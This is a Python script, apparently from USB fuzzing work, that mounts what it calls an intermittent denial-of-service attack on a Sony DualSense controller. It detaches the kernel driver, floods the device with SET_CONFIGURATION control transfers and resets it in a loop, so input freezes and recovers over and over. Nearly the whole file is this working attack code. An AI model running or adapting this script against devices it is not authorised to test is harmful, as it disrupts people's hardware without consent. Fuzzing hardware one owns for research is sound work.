# fuzz_ds5_mild.py
# Phase 2B: The "Mild DOS" (Intermittent Mode)
# Solves the USBError: Resource Busy by relying on the kernel's automatic re-enumeration.

import usb.core
import usb.util
import sys
import time

VENDER_ID = 0x054C
PRODUCT_ID = 0x0CE6

# --- CONFIGURATION FOR INTERMITTENT DOS ---
BURST_PACKETS = 150  # Packets to send while driver is detached (guaranteed freeze)
RECOVERY_WINDOW = 3.0 # Time the driver is re-attached (inputs should work here)
# ------------------------------------------

print(f"Looking for device: {VENDER_ID:04x}:{PRODUCT_ID:0x} (DualSense 5)...")
dev = usb.core.find(idVendor=VENDER_ID, idProduct=PRODUCT_ID)
if dev is None:
    print("Device not found. Is it plugged in?")
    sys.exit(1)

print("Device found!")

# --- Initial Driver Detachment (Cleanup from previous runs) ---
# We must ensure the driver is clean before starting the dynamic loop
try:
    if dev.is_kernel_driver_active(0):
        dev.detach_kernel_driver(0)
    usb.util.release_interface(dev, 0)
    # We must explicitly re-find the device after the release for a fresh handle
    dev = usb.core.find(idVendor=VENDER_ID, idProduct=PRODUCT_ID)
    if dev is None:
        raise Exception("Device lost during cleanup.")
except Exception:
    pass

print(f"\n[PHASE 2B: INTERMITTENT DOS] Starting Dynamic Cycle.")
print(f"Input will FREEZE during the burst, then work during the {RECOVERY_WINDOW}s pause.")
print("Watch the gamepad tester for the cyclical input failure.")

try:
    while True:
        # We need to re-find the device handle on every loop because dev.reset() invalidates it.
        dev = usb.core.find(idVendor=VENDER_ID, idProduct=PRODUCT_ID)
        if dev is None:
             raise Exception("Device lost during cycle.")
             
        # --- PHASE 1: DOS BURST (Inputs FREEZE) ---
        # 1. Hostile Takeover: Detach driver to gain exclusive access for the flood
        if dev.is_kernel_driver_active(0):
            print("  [FREEZE] Detaching driver for DOS burst...")
            dev.detach_kernel_driver(0)

        # 2. Execute Flood
        # We need to explicitly claim the interface before sending ctrl_transfer after detachment.
        usb.util.claim_interface(dev, 0)
        print(f"  Sending {BURST_PACKETS} packets...")
        for _ in range(BURST_PACKETS):
            try:
                # The "SET_CONFIGURATION" flood
                dev.ctrl_transfer(0x00, 0x09, 0x0001, 0, 0)
            except Exception:
                pass
        
        # --- PHASE 2: RECOVERY WINDOW (Inputs WORK) ---
        # 3. Clean and Reset Hardware
        print("  [RECOVER] Sending USB Reset (Clean Hardware State)...")
        dev.reset()
        time.sleep(0.5)

        # 4. Release Handle and Allow Kernel Re-attachment
        # We MUST release our claim before the OS can re-attach the driver.
        # This is the key fix for the "Resource busy" error.
        usb.util.release_interface(dev, 0)
        
        # 5. Wait for Kernel to Re-attach and for Input Window
        print(f"  Releasing handle. Kernel will re-attach driver (Inputs Active)...")
        time.sleep(RECOVERY_WINDOW)

except KeyboardInterrupt:
    # --- Clean Exit ---
    print("\nAttack stopped. Ensuring device is released...")
    try:
        # Final cleanup: release the device handle.
        usb.util.release_interface(dev, 0)
        print("Device handle released.")
    except Exception as e:
        print(f"Error during final cleanup: {e}")
        print("Manual unplug/replug may be necessary.")
except Exception as e:
    print(f"\nFATAL ERROR: {e}")
    # Attempt final cleanup if a fatal error occurs
    try:
        usb.util.release_interface(dev, 0)
    except Exception:
        pass
